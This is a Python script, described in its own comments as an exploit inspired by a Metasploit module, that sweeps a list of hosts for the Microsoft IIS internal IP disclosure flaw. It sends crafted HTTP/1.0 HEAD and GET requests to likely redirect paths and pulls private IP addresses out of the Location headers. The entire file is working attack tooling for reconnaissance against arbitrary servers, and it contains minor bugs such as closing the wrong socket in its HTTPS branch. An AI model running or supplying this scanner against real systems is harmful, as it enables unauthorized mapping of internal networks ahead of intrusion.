import re
import socket
import ssl
from colorama import Fore, Style, Back
from time import sleep

# This exploit is inspired by metasaploit module "Microsoft IIS HTTP Internal IP Disclosure"
# But we try too cover more possible situiations
# Hosts list are in a format like this
# <prorocol>://<domain or IP address>:<port>
# For more info read the example_hosts.txt


hosts_file = "path to example_hosts.txt"
hosts_list = open(hosts_file, 'r').readlines()


protocol = ''
server_name = ''
server_ip = ''
server_port = ''
found = False


# We need some 30* redirection to find the internal IP !
# These urls may cause a redirect
# If you know specific redirection url in target web server add it below
# remember to remove the ending "/"
# like this "/admin" not this "/admin/"

possible_iis_redirect_urls = [
    '/',
    '/aspnet_client',
    '/images',
    '/uploads',
    '/files',
    '/updatemanager',
    '/users',
    '/all',
    '/modules',
    '/admin'
]

# Our preference http method  is HEAD
# But there may not be any routes for HEAD method 
# So we try GET method too

http_methods = [
    'HEAD',
    'GET'
]


def enumerate_internal_IP_addresses():

    global found

    for host in hosts_list:
        
        if host == "\n" or host == '' or host[0] == "#":
            continue

        if host[len(host)-1] == "\n":
            host = host[:-1]

        protocol = host[ : host.find("://")]
        server_name = host[host.find("://") + 3 : host.find(":", 6)]
        server_port = int(host[host.find(":", 7) + 1 : ])

        url = possible_iis_redirect_urls[2]
        regex_compiler = re.compile(r"^\d+\.\d+\.\d+\.\d+")

        http_requests = []

        for method in http_methods:
            for url in possible_iis_redirect_urls:
                http_requests.append("{} {} HTTP/1.0\r\nConnection: close\r\n\r\n".format(method, url))

        if regex_compiler.match(server_name) == None:
            try:
                server_ip = socket.gethostbyname(server_name)
                print(Fore.LIGHTCYAN_EX + "* Host {}:{} resolved to IP {}:{}\n".format(server_name, server_port, server_ip, server_port) + Style.RESET_ALL)
            except:
                print(Back.LIGHTRED_EX)
                print("    [-] Error on resolving the host {}".format(server_name))
                print(Style.RESET_ALL)
                continue
        else:
            server_ip = server_name
        
        
        if protocol == 'http':

            for request in http_requests:

                method = request[ : request.find(" ")]
                url = request[request.find(" ") + 1 : request.find("HTTP") - 1]

                try:
                    sock_http = socket.create_connection((server_name, server_port))
                    sock_http.settimeout(10)
                except:
                    print(Back.LIGHTRED_EX)
                    print("    [-] Error on connecting to host {}:{}".format(server_name, server_port))
                    print(Style.RESET_ALL)
                    sock_http.close()
                    break
                
                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying request {}".format(request.encode()) )

                sock_http.sendall(request.encode())

                response = ''
                recv = sock_http.recv(1024).decode()
                response += recv

                if response != '' and response.find("Location") > -1 and response.find("http") > -1:
                    
                    tmp_index_1 = response.find("http")
                    tmp_index_2 = response.find("\n", tmp_index_1)

                    location = response[ tmp_index_1 : tmp_index_2 ]
                    
                    if regex_compiler.match(location[location.find("://") + 3: location.find("/", location.find("://") + 3)]) == None:
                        # print(Fore.LIGHTYELLOW_EX)
                        # print("    [!] Redirection found with location header but does not contain IP address !!", end="\r")
                        # print("    [!] Location header response : " + location + Style.RESET_ALL, end="\r\r\r")
                        # sleep(1)
                        sock_http.close()
                        continue
                    
                    print()
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " private IP address found for {}".format(host))
                    print(Fore.LIGHTGREEN_EX + "    [+]  Internal IP address redirection : " + Fore.LIGHTGREEN_EX + location)
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " HTTP method : {}".format(method))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Redirect URL : {}".format(url))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Raw request : {}".format(request.encode()))

                    sleep(1)
                    found = True

                    sock_http.close()
                    
                    break
                    
                sock_http.close()

            if not found:
                print(Fore.LIGHTRED_EX + "\n    [-] No Internal IP address found for {}:{} with all possible methods and urls\n".format(server_name, server_port) + Style.RESET_ALL)                

            print("\n**************************************************************************************\n")

                    

        elif protocol == 'https':
            
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

            for request in http_requests:

                method = request[ : request.find(" ")]
                url = request[request.find(" ") + 1 : request.find("HTTP") - 1]

                try:
                    sock_https = socket.create_connection((server_name, server_port))
                    context = ssl.SSLContext()
                    ssock = context.wrap_socket(sock_https, server_hostname=server_name)
                    ssock.settimeout(10)
                except:
                    print(Back.LIGHTRED_EX)
                    print("    [-] Error on connecting to host {}:{}".format(server_name, server_port))
                    print(Style.RESET_ALL)
                    sock_https.close()
                    ssock.close()
                    break

                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying request {}".format(request.encode()) )
                
                request = "{} {} HTTP/1.0\r\nConnection: close\r\n\r\n".format(method, url)
                ssock.sendall(request.encode())
                    
                response = ''
                recv = ssock.recv(1024).decode()
                response += recv 
                
                if response != '' and response.find("Location") > -1 and response.find("http") > -1:

                    tmp_index_1 = response.find("http")
                    tmp_index_2 = response.find("\n", tmp_index_1)

                    location = response[ tmp_index_1: tmp_index_2 ]
                    if regex_compiler.match(location[location.find("://") + 3: location.find("/", location.find("://") + 3)]) == None:
                        # print(Fore.LIGHTYELLOW_EX)
                        # print("    [!] Redirection found with location header but does not contain IP address !!")
                        # print("    [!] Location header response : {}".format(location) + Style.RESET_ALL, end="\r")
                        # sleep(1)
                        sock_http.close()
                        ssock.close()
                        continue
                    
                    print()
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " private IP address found for {}".format(host))
                    print(Fore.LIGHTGREEN_EX + "    [+]  Internal IP address redirection : " + Fore.LIGHTGREEN_EX + location)
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " HTTP method : {}".format(method))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Redirect URL : {}".format(url))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Raw request : {}".format(request.encode()))

                    sleep(1)
                    found = True

                    sock_https.close()
                    ssock.close()
                    break
                
                sock_https.close()
                ssock.close()

            if not found:
                print(Fore.LIGHTRED_EX + "\n    [-] No Internal IP address found for {}:{} with all possible methods and urls\n".format(server_name, server_port) + Style.RESET_ALL)                

            print("\n**************************************************************************************\n")

            
if __name__ == "__main__":
    enumerate_internal_IP_addresses()